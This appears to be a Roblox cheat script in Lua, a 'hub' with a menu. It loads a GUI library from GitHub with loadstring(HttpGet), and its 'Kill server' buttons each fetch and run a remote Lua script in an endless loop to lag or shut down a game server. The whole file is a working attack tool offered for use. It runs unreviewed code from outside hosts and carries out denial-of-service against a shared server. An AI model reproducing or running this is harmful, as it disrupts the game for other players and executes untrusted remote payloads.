local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()

local Window = Library:NewWindow("Arbix Hub")

local Section = Window:NewSection("GK")
-- Toggle for Auto GK
Section:CreateButton("Auto GK", function()
    
end)



local Section = Window:NewSection("OP THINGS")

Section:CreateButton("Kill server ( SUPER LAG )", function()
    while true do
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Youifpg/Ahh/refs/heads/main/Lua.lua"))()
      wait(0)
    end
end)

Section:CreateButton("Kill server ( NORMAL LAG )", function()
    while true do
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Youifpg/Ahh/refs/heads/main/Lua.lua"))()
      wait(1)
    end
end)

Section:CreateButton("Kill server ( SHUTDOWN THE SERVER )", function()
    while true do
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Youifpg/Ahh/refs/heads/main/Lua.lua"))()
      wait()
    end
end)
